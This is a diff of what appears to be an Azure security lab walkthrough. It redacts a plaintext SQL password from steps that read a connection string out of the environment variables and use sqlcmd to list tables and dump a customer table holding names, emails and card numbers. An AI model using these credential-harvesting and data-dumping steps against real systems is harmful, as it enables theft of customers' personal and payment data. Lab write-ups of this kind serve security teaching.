@@ -445,16 +445,16 @@ Another option is to check for [connection string](https://learn.microsoft.com/e
 ```
 PS C:\home> env
 <SNIP>
-APPSETTING_DB=Server=tcp:megabigdevsqlserver.database.windows.net,1433;Initial Catalog=customerdevneddb;User ID=dbuser;Password=V%#J3c5jceryjcE
+APPSETTING_DB=Server=tcp:megabigdevsqlserver.database.windows.net,1433;Initial Catalog=customerdevneddb;User ID=dbuser;Password=<REDACTED>
 <SNIP>
-DB=Server=tcp:megabigdevsqlserver.database.windows.net,1433;Initial Catalog=customerdevneddb;User ID=dbuser;Password=V%#J3c5jceryjcE
+DB=Server=tcp:megabigdevsqlserver.database.windows.net,1433;Initial Catalog=customerdevneddb;User ID=dbuser;Password=<REDACTED>
 <SNIP>
 ```
 
 We find a connecting string for an azure SQL instance at the well-known domain `database.windows.net`. We can use `sqlcmd` since it's installed in the current session. Let's enumerate the database
 ```
-PS C:\home> sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
-sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
+PS C:\home> sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
+sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
 TABLE_NAME                                                                                                                      
 
 --------------------------------------------------------------------------------------------------------------------------------
@@ -468,8 +468,8 @@ CustomerData
 
 Let's dump the table, which reveals PII (personally identifiable information) of Mega Big Tech customers
 ```
-PS C:\home> sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT * FROM CustomerData"
-sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT * FROM CustomerData"
+PS C:\home> sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT * FROM CustomerData"
+sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P '<REDACTED>' -d customerdevneddb -Q "SELECT * FROM CustomerData"
 ID          FirstName                                          LastName                                           Email                                                                                                CreditCardNumber                
 
 ----------- -------------------------------------------------- -------------------------------------------------- ---------------------------------------------------------------------------------------------------- --------------------------------
